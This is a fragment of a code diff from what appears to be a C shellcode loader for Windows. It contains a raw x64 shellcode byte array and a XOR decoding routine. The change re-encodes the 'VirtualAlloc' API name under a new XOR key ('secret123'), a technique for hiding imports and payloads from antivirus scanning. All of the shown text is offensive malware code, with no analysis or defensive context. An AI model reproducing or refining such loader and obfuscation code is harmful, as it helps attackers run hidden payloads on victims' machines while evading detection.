@@ -43,9 +43,11 @@ unsigned char payload[] = "\x48\x83\xEC\x28\x48\x83\xE4\xF0\x48\x8D\x15\x66\x00\
 "\x4C\x4C\x00\x49\x8B\xCC\x41\xFF\xD7\x49\x8B\xCC\x48\x8B\xD6"
 "\xE9\x14\xFF\xFF\xFF\x48\x03\xC3\x48\x83\xC4\x28\xC3";
 
-unsigned char cVirtualAlloc[] = { 0x25, 0xc, 0x11, 0x6, 0x10, 0x15, 0x1f, 0x24, 0xf, 0x1e, 0xa, 0x17 };
+// unsigned char cVirtualAlloc[] = { 0x25, 0xc, 0x11, 0x6, 0x10, 0x15, 0x1f, 0x24, 0xf, 0x1e, 0xa, 0x17 };
 
-char secretKey[] = "secret";
+unsigned char cVirtualAlloc[] = { 0x25, 0xc, 0x11, 0x6, 0x10, 0x15, 0x5d, 0x73, 0x5f, 0x1f, 0xa, 0x0 };
+
+char secretKey[] = "secret123";
 
 // encryption / decryption XOR function
 void deXOR(char *buffer, size_t bufferLength, char *key, size_t keyLength) {
